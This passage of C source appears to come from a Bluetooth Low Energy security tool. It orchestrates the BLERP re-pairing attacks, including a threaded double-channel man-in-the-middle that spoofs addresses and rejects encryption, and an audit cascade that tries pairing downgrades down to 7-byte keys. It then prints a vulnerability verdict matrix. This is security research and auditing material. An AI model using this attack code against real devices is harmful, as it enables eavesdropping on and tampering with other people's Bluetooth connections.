    struct blerp_attack_config cfg_pi = *cfg;
    cfg_pi.type = BLERP_ATTACK_PI;
    memcpy(cfg_pi.spoof_addr, cfg->target_addr, 6);
    cfg_pi.spoof_type = cfg->target_type;
    memset(cfg_pi.target_addr, 0, sizeof cfg_pi.target_addr);
    // Table II (BLERP paper): V5 is required for the PI attack, including as
    // a double-channel building block, not optional -- force it regardless of
    // the caller's cfg.reject_enc (blerp_config_init only defaults it to true
    // for a standalone "pi" run, not for "mitm").
    cfg_pi.reject_enc = true;

    // CI side: impersonate the victim Central (cfg->spoof_addr, if given) to
    // the victim Peripheral (cfg->target_addr), on the secondary adapter.
    struct blerp_attack_config cfg_ci = *cfg;
    cfg_ci.type = BLERP_ATTACK_CI;
    cfg_ci.dev_id = cfg->dev_id_sec;

    struct blerp_attack_report rep_pi, rep_ci;
    memset(&rep_pi, 0, sizeof rep_pi);
    memset(&rep_ci, 0, sizeof rep_ci);

    printf("  [*] Starting BLERP double-channel MitM:\n");
    printf("      hci%d -> PI against the victim Central, spoofing Peripheral %02X:%02X:%02X:%02X:%02X:%02X\n",
           cfg_pi.dev_id,
           cfg_pi.spoof_addr[5], cfg_pi.spoof_addr[4], cfg_pi.spoof_addr[3],
           cfg_pi.spoof_addr[2], cfg_pi.spoof_addr[1], cfg_pi.spoof_addr[0]);
    printf("      hci%d -> CI against the victim Peripheral %02X:%02X:%02X:%02X:%02X:%02X\n",
           cfg_ci.dev_id,
           cfg_ci.target_addr[5], cfg_ci.target_addr[4], cfg_ci.target_addr[3],
           cfg_ci.target_addr[2], cfg_ci.target_addr[1], cfg_ci.target_addr[0]);
    printf("  [*] Both links run concurrently; their traces below may interleave.\n\n");

    struct blerp_mitm_side pi_side = { &cfg_pi, &rep_pi, blerp_run_pi, -1 };
    struct blerp_mitm_side ci_side = { &cfg_ci, &rep_ci, blerp_run_ci, -1 };

    pthread_t pi_thread;
    int err = pthread_create(&pi_thread, NULL, blerp_mitm_thread_main, &pi_side);
    if (err != 0) {
        fprintf(stderr, "  [-] Failed to start the PI thread: %s\n", strerror(err));
        return -1;
    }

    // Run the CI side on this thread; the two adapters are independent so
    // this overlaps with the PI thread above instead of waiting for it.
    ci_side.rc = blerp_run_ci(ci_side.cfg, ci_side.rep);
    pthread_join(pi_thread, NULL);

    if (pi_side.rc < 0 || ci_side.rc < 0) {
        fprintf(stderr, "  [-] Double-channel MitM aborted: the %s%s%s adapter could not be used.\n",
                pi_side.rc < 0 ? "PI" : "", (pi_side.rc < 0 && ci_side.rc < 0) ? "/" : "",
                ci_side.rc < 0 ? "CI" : "");
        return -1;
    }

    // The two sides negotiate independent PKs with two different peers, so
    // most per-side SMP fields (negotiated_authreq/keysize, stk, ...) are not
    // merged into a single ambiguous value here -- see the summary below and
    // each side's own trace for those. connected/phase2_completed reflect the
    // double-channel position as a whole: both links must come up for Charlie
    // to actually sit in the middle.
    rep->connected = rep_pi.connected && rep_ci.connected;
    rep->phase2_completed = rep_pi.connected && rep_pi.phase2_completed &&
                            rep_ci.connected && rep_ci.phase2_completed;
    rep->enc_rejected   = rep_pi.enc_rejected;
    rep->secreq_sent    = rep_pi.secreq_sent;
    rep->preq_received  = rep_pi.preq_received;
    rep->pres_sent      = rep_pi.pres_sent;
    rep->preq_sent      = rep_ci.preq_sent;
    rep->pres_received  = rep_ci.pres_received;
    rep->pairing_failed = rep_pi.pairing_failed || rep_ci.pairing_failed;
    rep->fail_reason    = rep_pi.pairing_failed ? rep_pi.fail_reason : rep_ci.fail_reason;

    printf("\n  %s=== Double-channel MitM summary ===%s\n", UI_PINK, UI_RESET);
    printf("  Alice side (PI, hci%d): %s\n", cfg_pi.dev_id,
           rep_pi.phase2_completed ? "new PK established with the attacker" :
           rep_pi.connected ? "connected, pairing not completed" : "no victim Central connected");
    printf("  Bob side   (CI, hci%d): %s\n", cfg_ci.dev_id,
           rep_ci.phase2_completed ? "new PK established with the attacker" :
           rep_ci.connected ? "connected, pairing not completed" : "could not reach the victim Peripheral");

    if (rep->phase2_completed) {
        printf("  %s[+] Double-channel MitM position established: Charlie holds two independent PKs "
               "and can eavesdrop, drop, modify, or inject messages between Alice and Bob.%s\n",
               UI_GREEN, UI_RESET);
    } else {
        printf("  %s[-] Double-channel MitM incomplete: see the trace above for the side that failed.%s\n",
               UI_ORANGE, UI_RESET);
    }

    return 0;
}

// Full automated audit of V1 to V6 against a target, cascading to next vulnerability if one is rejected.
int blerp_run_audit(const struct blerp_attack_config *cfg,
                    const struct smp_bond_info *bond,
                    struct blerp_attack_report *rep) {
    if (!cfg || !rep) return -1;
    memset(rep, 0, sizeof *rep);

    printf("\n  %s=== Starting Automated BLERP Attack & Audit Suite ===%s\n", UI_PINK, UI_RESET);

    if (cfg->type == BLERP_ATTACK_PI) {
        // --- Central Audit Cascade (PI Mode) ---
        // Step 1: Test V5 (Session Interruption & Fallback)
        printf("  [*] Step 1: Testing V5 (Session break & encryption rejection)...\n");
        struct blerp_attack_config c_cfg = *cfg;
        c_cfg.reject_enc = true;
        c_cfg.send_secreq = false;
        blerp_run_pi(&c_cfg, rep);

        // If Central did not fall back to re-pairing, proceed to next vulnerability: V1
        if (!rep->phase2_completed && !rep->preq_received) {
            printf("\n  [-] V5 did not trigger re-pairing. Proceeding to next vulnerability -> V1...\n");
            printf("  [*] Step 2: Testing V1 (Unauthenticated Security Request)...\n");
            c_cfg.reject_enc = false;
            c_cfg.send_secreq = true;
            c_cfg.sec_req_authreq = (bond && bond->authenticated) ? 0x05 : 0x01;
            struct blerp_attack_report rep_v1;
            memset(&rep_v1, 0, sizeof rep_v1);
            blerp_run_pi(&c_cfg, &rep_v1);
            if (rep_v1.connected) {
                rep->connected = true;
                rep->secreq_sent = rep_v1.secreq_sent;
                rep->preq_received = rep_v1.preq_received;
                rep->pres_sent = rep_v1.pres_sent;
                rep->phase2_completed = rep_v1.phase2_completed;
                rep->negotiated_authreq = rep_v1.negotiated_authreq;
                rep->negotiated_keysize = rep_v1.negotiated_keysize;
                memcpy(rep->stk, rep_v1.stk, 16);
            }
        }
    } else {
        // --- Peripheral Audit Cascade (CI Mode) ---
        // Step 1: Test V2 with aggressive downgrade (AuthReq=0x01 Just Works, KeySize=7) -> V4 and V6 candidate
        printf("  [*] Step 1: Testing V2 + V4 + V6 (Unauthenticated Re-Pairing, Just Works, 7-byte key)...\n");
        struct blerp_attack_config c_cfg = *cfg;
        c_cfg.downgraded_authreq = 0x01;
        c_cfg.downgraded_keysize = 7;
        blerp_run_ci(&c_cfg, rep);

        // If rejected on Key Size (0x06) or generic (0x08): test if key size was the blocker!
        // Fall back to Step 2: Test V2 + V4 with standard 16-byte key
        if (rep->pairing_failed) {
            printf("\n  [-] Pairing rejected (reason 0x%02x). Testing next parameter combination...\n", rep->fail_reason);
            printf("  [*] Step 2: Testing V2 + V4 with standard 16-byte key (AuthReq=0x01)...\n");
            c_cfg.downgraded_authreq = 0x01;
            c_cfg.downgraded_keysize = 16;
            struct blerp_attack_report rep_s2;
            memset(&rep_s2, 0, sizeof rep_s2);
            usleep(250000);
            blerp_run_ci(&c_cfg, &rep_s2);
            if (rep_s2.connected) {
                if (rep_s2.pres_received || rep_s2.phase2_completed) {
                    rep->pres_received = rep_s2.pres_received;
                    rep->phase2_completed = rep_s2.phase2_completed;
                    rep->negotiated_authreq = rep_s2.negotiated_authreq;
                    rep->negotiated_keysize = rep_s2.negotiated_keysize;
                    rep->pairing_failed = false;
                    memcpy(rep->stk, rep_s2.stk, 16);
                } else {
                    rep->pairing_failed = rep_s2.pairing_failed;
                    rep->fail_reason = rep_s2.fail_reason;
                }
            }
        }

        // If still rejected: test if missing MITM authentication was the blocker!
        // Fall back to Step 3: Test V2 with MITM authentication (AuthReq=0x05, KeySize=16)
        if (rep->pairing_failed) {
            printf("\n  [-] Pairing still rejected (reason 0x%02x). Testing next vulnerability level...\n", rep->fail_reason);
            printf("  [*] Step 3: Testing V2 with MITM authentication (AuthReq=0x05, KeySize=16)...\n");
            c_cfg.downgraded_authreq = 0x05; // MITM=1, Bonding=1
            c_cfg.downgraded_keysize = 16;
            struct blerp_attack_report rep_s3;
            memset(&rep_s3, 0, sizeof rep_s3);
            usleep(250000);
            blerp_run_ci(&c_cfg, &rep_s3);
            if (rep_s3.connected) {
                if (rep_s3.pres_received || rep_s3.phase2_completed) {
                    rep->pres_received = rep_s3.pres_received;
                    rep->phase2_completed = rep_s3.phase2_completed;
                    rep->negotiated_authreq = rep_s3.negotiated_authreq;
                    rep->negotiated_keysize = rep_s3.negotiated_keysize;
                    rep->pairing_failed = false;
                    memcpy(rep->stk, rep_s3.stk, 16);
                } else {
                    rep->pairing_failed = rep_s3.pairing_failed;
                    rep->fail_reason = rep_s3.fail_reason;
                }
            }
        }
    }

    blerp_classify_vulnerabilities(bond, rep, rep);
    return 0;
}

// Print formatted attack report and vulnerability matrix.
void blerp_print_report(const struct blerp_attack_config *cfg,
                        const struct smp_bond_info *bond,
                        const struct blerp_attack_report *rep) {
    if (!cfg || !rep) return;

    printf("\n  %s================================================================%s\n", UI_PINK, UI_RESET);
    printf("  %s          BLERP VULNERABILITY ASSESSMENT MATRIX (NDSS 2026)      %s\n", UI_BOLD, UI_RESET);
    printf("  %s================================================================%s\n\n", UI_PINK, UI_RESET);

    if (bond) {
        printf("  [BOND] Baseline Stored Level (ARPK) : %s, %d bytes key\n",
               bond->authenticated ? "Authenticated (MITM)" : "Unauthenticated",
               bond->enc_size);
    }

    if (rep->phase2_completed) {
        printf("  %s[+] Session Key Overwritten : STK derived (%d bytes)%s\n",
               UI_GREEN, rep->negotiated_keysize, UI_RESET);
    }

    printf("\n  +----+--------------------------------------------------+-------------+\n");
    printf("  | ID | Vulnerability Description                        | Verdict     |\n");
    printf("  +----+--------------------------------------------------+-------------+\n");

    for (int i = 0; i < BLERP_VULN_COUNT; i++) {
        enum blerp_vuln v = (enum blerp_vuln)i;
        enum blerp_verdict verd = rep->verdicts[v];
        const char *vcolor = (verd == BLERP_VERDICT_YES) ? UI_RED
                           : (verd == BLERP_VERDICT_NO)  ? UI_GREEN
                           : UI_ORANGE;
        printf("  | %-2s | %-48.48s | %s%-11s%s |\n",
               blerp_vuln_code(v),
               blerp_vuln_title(v),
               vcolor, blerp_verdict_label(verd), UI_RESET);
    }
    printf("  +----+--------------------------------------------------+-------------+\n\n");

    printf("  %sDetails per Vulnerability:%s\n", UI_BOLD, UI_RESET);
    for (int i = 0; i < BLERP_VULN_COUNT; i++) {
        enum blerp_vuln v = (enum blerp_vuln)i;
        printf("  [%s] %s: %s\n", blerp_vuln_code(v), blerp_vuln_title(v),
               rep->vuln_details[v][0] ? rep->vuln_details[v] : "(not observed)");
    }
    printf("\n");
}

// Start every verdict as inconclusive: nothing has been observed yet.
void blerp_target_verdict_init(struct blerp_target_verdict *t) {
    if (!t) return;
    for (int i = 0; i < BLERP_VULN_COUNT; i++) {
        t->v[i] = BLERP_VERDICT_INCONCLUSIVE;
    }
    t->refusal = 0;
}

// Fold one run's verdicts into `t`. One confirmed YES is enough to call the
// target vulnerable, so a later NO must never overwrite it.
void blerp_target_verdict_merge(struct blerp_target_verdict *t,
                                const enum blerp_verdict *v, uint8_t refusal) {
    if (!t || !v) return;
    for (int i = 0; i < BLERP_VULN_COUNT; i++) {
        if (v[i] == BLERP_VERDICT_YES) {
            t->v[i] = BLERP_VERDICT_YES;
        } else if (v[i] == BLERP_VERDICT_NO && t->v[i] != BLERP_VERDICT_YES) {
            t->v[i] = BLERP_VERDICT_NO;
        }
    }
    if (refusal && !t->refusal) {
        t->refusal = refusal;
    }
}

// Any confirmed vulnerability makes the target vulnerable. Without one, only a
// refusal of the unauthenticated re-pairing (V2 = NO) is positive evidence of
// protection; anything else is inconclusive.
enum blerp_rating blerp_target_rating(const struct blerp_target_verdict *t) {
    if (!t) return BLERP_RATING_INCONCLUSIVE;
    for (int i = 0; i < BLERP_VULN_COUNT; i++) {
        if (t->v[i] == BLERP_VERDICT_YES) return BLERP_RATING_VULNERABLE;
    }
    if (t->v[BLERP_V2_UNAUTH_REPAIR] == BLERP_VERDICT_NO) return BLERP_RATING_PROTECTED;
    return BLERP_RATING_INCONCLUSIVE;
}
